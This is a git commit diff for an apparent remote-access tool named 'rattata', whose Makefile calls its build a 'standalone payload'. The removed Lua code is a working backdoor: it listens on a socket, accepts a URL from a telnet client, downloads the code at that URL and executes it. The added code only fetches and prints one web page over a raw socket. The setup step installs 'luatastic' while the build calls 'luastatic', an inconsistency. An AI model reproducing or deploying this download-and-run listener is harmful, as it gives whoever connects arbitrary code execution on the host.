9ed405f2ef265191088dd0bf2baec9d0929bbd6a
David Konsumer <konsumer@jetboystudio.com>
2020-12-23 20:03:53 -0800

    use pure socket lib to skirt around native issues

--- Makefile
+++ Makefile
@@ -6,17 +6,15 @@ help: ## show this help
 	@grep -E '^[a-zA-Z_-]+:.*?## .*$$' $(MAKEFILE_LIST) | awk 'BEGIN {FS = ":.*?## "}; {printf "\033[36m%-30s\033[0m %s\n", $$1, $$2}'
 
 setup: ## Install dependencies. Requires luarocks installed.
-	sudo luarocks install luasocket
-	sudo luarocks install http
-	sudo luarocks install luapak
+	sudo luarocks install luatastic
 
 run: ## Run rattata service
 	@luajit src/rattata.lua
 
-build: dist/rattata ## compile standalone payload
+build: rattata ## compile standalone payload
 
 clean: # delete generated files
 	rm -rf dist .luapak
 
-dist/rattata:
-	luapak make --lua-lib=/usr/lib/x86_64-linux-gnu/libluajit-5.1.so
+rattata:
+	luastatic src/rattata.lua /usr/lib/x86_64-linux-gnu/libluajit-5.1.a -I/usr/include/luajit-2.1
--- src/rattata.lua
+++ src/rattata.lua
@@ -1,26 +1,42 @@
-local socket = require 'socket'
-local http_request = require 'http.request'
 
-local server = assert(socket.bind('*', 0))
-local ip, port = server:getsockname()
+local socket = require "src.ljsocket"
 
-print('Please telnet to localhost on port ' .. port .. '. Give it a URL to download & run.')
+local host = "www.freebsd.no"
 
+local socket = assert(socket.create("inet", "stream", "tcp"))
+assert(socket:connect(host, "http"))
+assert(socket:send(
+    "GET / HTTP/1.1\r\n"..
+    "Host: " .. host .. "\r\n"..
+    "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0\r\n"..
+    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"..
+    "Accept-Language: nb,nb-NO;q=0.9,en;q=0.8,no-NO;q=0.6,no;q=0.5,nn-NO;q=0.4,nn;q=0.3,en-US;q=0.1\r\n"..
+    "DNT: 1\r\n"..
+    "Connection: keep-alive\r\n"..
+    "Upgrade-Insecure-Requests: 1\r\n"..
+    "\r\n"
+))
 
-function run(url)
-  local headers, stream = assert(http_request.new_from_uri(url):go())
-  local body = assert(stream:get_body_as_string())
-  if headers:get ':status' ~= '200' then
-    error(body)
-  end
-  local f = loadstring(body)
-  return f()
+local total_length
+local str = ""
+
+while true do
+    local chunk = assert(socket:receive())
+
+    if not chunk then
+        break
+    end
+
+    str = str .. chunk
+
+    if not total_length then
+        total_length = tonumber(str:match("Content%-Length: (%d+)"))
+    end
+
+    local magic = "0\r\n\r\n"
+    if str:sub(-#magic) == magic or (total_length and #str >= total_length) then
+        break
+    end
 end
 
-while 1 do
-  local client = server:accept()
-  local url, err = client:receive()
-  if not err then client:send('Downloading '..url .. '\n') end
-  run(url)
-  client:close()
-end
+print(str)
